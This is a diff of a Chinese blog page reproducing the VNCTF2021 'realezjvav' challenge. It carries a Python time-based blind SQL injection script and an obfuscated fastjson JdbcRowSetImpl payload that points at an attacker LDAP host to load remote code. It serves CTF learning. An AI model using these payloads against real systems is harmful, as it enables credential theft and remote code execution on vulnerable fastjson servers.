@@ -13,15 +13,15 @@
 <meta property="og:site_name" content="y0lo&#39;s blogs">
 <meta property="og:description" content="前言自己太菜了，VNCTF没做出来几个题，签到即退场。 考点简单的SQL注入 fastjson Rce复现">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/image-20210316214000589.png">
-<meta property="og:image" content="http://example.com/image-20210316214845265.png">
-<meta property="og:image" content="http://example.com/image-20210316220526132.png">
-<meta property="og:image" content="http://example.com/image-20210316220614741.png">
+<meta property="og:image" content="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214000589.png">
+<meta property="og:image" content="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214845265.png">
+<meta property="og:image" content="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220526132.png">
+<meta property="og:image" content="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220614741.png">
 <meta property="article:published_time" content="2021-03-16T13:11:37.000Z">
 <meta property="article:modified_time" content="2021-03-16T14:09:16.237Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/image-20210316214000589.png">
+<meta name="twitter:image" content="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214000589.png">
   
     <link rel="alternate" href="/atom.xml" title="y0lo's blogs" type="application/atom+xml">
   
@@ -108,14 +108,14 @@
 <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在Fastjson&lt;&#x3D;1.2.47存在fastjson反序列化漏洞。</p>
 <p>关于Fastjson 1.2.47 可以看这篇文章 <a target="_blank" rel="noopener" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">fastjson</a></p>
 <p>这题根据提示Only the admin can get the right. 可以猜到用户名，password那里通过fuzz</p>
-<p><img src="/image-20210316214000589.png" alt="image-20210316214000589"></p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214000589.png" alt="image-20210316214000589"></p>
 <p>可以发现<code>&#39;#</code>的时候会返回200，sleep，空格，benchmark等都被ban了，本题用的是笛卡尔积时间盲注。</p>
 <p>payload:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> true:</span><br><span class="line">        j=head+(tail-head)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="built_in">min</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=<span class="string">&quot;-1&#x27;or if(ascii(substr(password,&#123;&#125;,1))&lt;&#123;&#125;,(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.tables C),1)#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.7</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        sleep(<span class="number">0.4</span>)</span><br></pre></td></tr></table></figure>
 
 <p>跑出password，登录网站。</p>
 <p>这个图片存放路径<code>searchimage</code>存在一个任意文件读取。</p>
-<p><img src="/image-20210316214845265.png" alt="image-20210316214845265"></p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316214845265.png" alt="image-20210316214845265"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.2.27&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
 
 <p>通过pom.xml可以看到<code>fastion</code>的依赖</p>
@@ -142,13 +142,13 @@
 <p>payload:</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roleJson=<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://x.x.x.x:port2/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/image-20210316220526132.png" alt="image-20210316220526132"></p>
-<p><img src="/image-20210316220614741.png" alt="image-20210316220614741"></p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220526132.png" alt="image-20210316220526132"></p>
+<p><img src="/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/image-20210316220614741.png" alt="image-20210316220614741"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" data-id="cl09mxta2000b30vjcr7c7h1r" data-title="[VNCTF2021]realezjvav复现" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/03/16/VNCTF-realezjvav%E5%A4%8D%E7%8E%B0/" data-id="cl0ae9tgj0009j0vj1iwccnnr" data-title="[VNCTF2021]realezjvav复现" class="article-share-link">Share</a>
       
       
       
